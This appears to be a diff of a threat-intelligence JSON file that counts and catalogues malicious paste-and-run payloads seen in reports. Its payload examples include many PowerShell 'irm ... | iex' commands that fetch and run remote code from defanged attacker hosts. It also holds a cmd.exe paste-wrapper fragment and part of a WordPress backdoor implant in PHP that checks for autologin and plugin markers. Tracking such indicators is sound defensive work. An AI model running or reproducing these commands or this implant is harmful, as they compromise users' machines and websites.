@@ -172,14 +172,11 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 54,
-    "ReportCount": 54,
-    "FirstSeen": "2026-11-19T11:11:16.252000+00:00",
+    "DistinctPayloadCount": 51,
+    "ReportCount": 51,
+    "FirstSeen": "2026-11-19T12:14:05.883000+00:00",
     "LastSeen": "2026-11-26T08:12:00.056000+00:00",
     "ReportIds": [
-      "cmwng9c5h1wcx0omlminlwu74",
-      "cmwng9yaz1weo0omlil8hkqpe",
-      "cmwngai5s1wfr0omlh7jmz11d",
       "cmwnii4tr1wvc0oml2fy1ka38",
       "cmwnwrsgu1xi10omlj9jbvrk0",
       "cmwo69tad1xsb0omltg23i5hb",
@@ -260,7 +257,6 @@
       "irm 'img-codes-cloude[.]info/4349f1daacd50bcc'|iex;",
       "irm 'img-codes-cloude[.]info/437dc7e50c68cd86'|iex;",
       "irm 'img-codes-cloude[.]info/4bcc3365f865c038'|iex;",
-      "irm 'img-codes-cloude[.]info/4dacdbba3b1cb474'|iex;",
       "irm 'img-codes-cloude[.]info/4e816a63fc53eaa4'|iex;",
       "irm 'img-codes-cloude[.]info/53ae2645eac6a23f'|iex;",
       "irm 'img-codes-cloude[.]info/569f53cf050814f3'|iex;",
@@ -268,7 +264,6 @@
       "irm 'img-codes-cloude[.]info/5d99abf403611db7'|iex;",
       "irm 'img-codes-cloude[.]info/5de787e49bd3ae8c'|iex;",
       "irm 'img-codes-cloude[.]info/621993c387443d46'|iex;",
-      "irm 'img-codes-cloude[.]info/733cc39bf1b16194'|iex;",
       "irm 'img-codes-cloude[.]info/783f029f67e20c9d'|iex;",
       "irm 'img-codes-cloude[.]info/7b0251a9d1cd7f8c'|iex;",
       "irm 'img-codes-cloude[.]info/830dbb6c74bd64f3'|iex;",
@@ -279,7 +274,6 @@
       "irm 'img-codes-cloude[.]info/a032e303c32e5dfc'|iex;",
       "irm 'img-codes-cloude[.]info/a3bde46f660137b8'|iex;",
       "irm 'img-codes-cloude[.]info/a54d10080461e81a'|iex;",
-      "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;",
       "irm 'img-codes-cloude[.]info/bf6b42dc73b402cd'|iex;",
       "irm 'img-codes-cloude[.]info/c0fdade6bf8b0ce9'|iex;",
       "irm 'img-codes-cloude[.]info/c5dee301a82e8e70'|iex;",
@@ -381,13 +375,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 13,
-    "ReportCount": 45,
-    "FirstSeen": "2026-11-19T11:10:43.018000+00:00",
+    "DistinctPayloadCount": 11,
+    "ReportCount": 43,
+    "FirstSeen": "2026-11-19T17:09:42.708000+00:00",
     "LastSeen": "2026-11-26T09:19:02.490000+00:00",
     "ReportIds": [
-      "cmwng8mio1wbu0oml0obq4vwk",
-      "cmwng99ob1wci0oml88ub4z4y",
       "cmwnt2anm1x7q0omlytin6ijo",
       "cmwnt3ci91x980omlku572i93",
       "cmwnt6b7q1xan0omlwi7e71xm",
@@ -438,11 +430,9 @@
       "IRM gitlab[.]com/cc4b6f224188/31863a48-57f3-41bd-b43d-d745c0e71e27/-/raw/main/b2df0d5d-e86b-4ac9-bf98-0f31b3843a70 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/efad4910-0ec9-439e-aa10-54dca6ba535e/-/raw/main/9869d9ad-7e4a-407a-8829-89c0d60614c7 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-      "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/cd459154-52c3-4436-9b70-b7b0b3a5c110/-/raw/main/cd459154-52c3-4436-9b70-b7b0b3a5c110 | IEX",
       "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-      "IRM gitlab[.]com/nova-84e1-18b2b/abba73a-484e-4a80-bc53-401c1e95160d/-/raw/main/ac9eDc0-d13C-422f-8cfC-9F91441BfAb2 | IEX",
       "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
       "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
       "IRM xlfsgudhiaokbioa[.]sisterleveling[.]com/1b60ae7b-21f3-4d74-bb56-138bf4f4620b/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX"
@@ -641,6 +631,20 @@
     ]
   },
   {
+    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-24T18:22:42.950000+00:00",
+    "LastSeen": "2026-11-26T11:09:20.516000+00:00",
+    "ReportIds": [
+      "cmwv0vfsi09qb0nmlg1r9m23j",
+      "cmwxg9tj90et40oml99nbobpa"
+    ],
+    "PayloadExamples": [
+      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
+    ]
+  },
+  {
     "Pattern": "$tok='<TOKEN>';$id='<HEX_ID>';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -651,19 +655,6 @@
     ],
     "PayloadExamples": [
       "$tok='OH5gRSYNWfLOBgk0ncAvvKiJtuvKCihWvCFsGEEcfBE';$id='0dea78b107d91fcf';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
-    ]
-  },
-  {
-    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-24T18:22:42.950000+00:00",
-    "LastSeen": "2026-11-24T18:22:42.950000+00:00",
-    "ReportIds": [
-      "cmwv0vfsi09qb0nmlg1r9m23j"
-    ],
-    "PayloadExamples": [
-      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
     ]
   },
   {
